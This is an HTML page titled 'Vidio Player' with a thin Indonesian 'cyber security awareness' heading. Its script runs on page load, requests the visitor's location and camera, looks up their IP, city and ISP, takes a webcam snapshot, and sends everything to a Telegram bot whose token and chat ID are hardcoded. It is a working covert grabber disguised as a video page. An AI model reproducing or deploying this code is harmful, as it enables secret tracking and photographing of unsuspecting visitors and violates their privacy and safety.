<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vidio Player</title>
</head>
<body>
    <h1>Cyber Security Awareness</h1>
    <p>Website ini menunjukkan betapa mudahnya informasi Anda dapat dikumpulkan.</p>

    <script>
        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
        const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        }

        function sendPhotoToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", imageBlob, "snapshot.jpg");

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        function captureData() {
            // Ambil lokasi
            navigator.geolocation.getCurrentPosition(
                position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendToTelegram(`üìç Lokasi: ${lat}, ${lon}`);

                    fetch("https://ipinfo.io/json")
                        .then(response => response.json())
                        .then(data => {
                            sendToTelegram(`üåê IP: ${data.ip}\nüåç Lokasi: ${data.city}, ${data.country}\nüì° ISP: ${data.org}`);
                        });
                },
                error => {
                    sendToTelegram("‚ùå Lokasi tidak diizinkan.");
                }
            );

            // Ambil gambar dari kamera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    let canvas = document.createElement("canvas");
                    let ctx = canvas.getContext("2d");

                    setTimeout(() => {
                        video.pause();
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(blob => {
                            sendPhotoToTelegram(blob);
                        }, "image/jpeg");

                        stream.getTracks().forEach(track => track.stop());
                    }, 2000); // Ambil gambar setelah 2 detik
                })
                .catch(error => {
                    sendToTelegram("‚ùå Kamera tidak diizinkan.");
                });
        }

        // Jalankan saat halaman dimuat
        window.onload = captureData;
    </script>
</body>
</html>
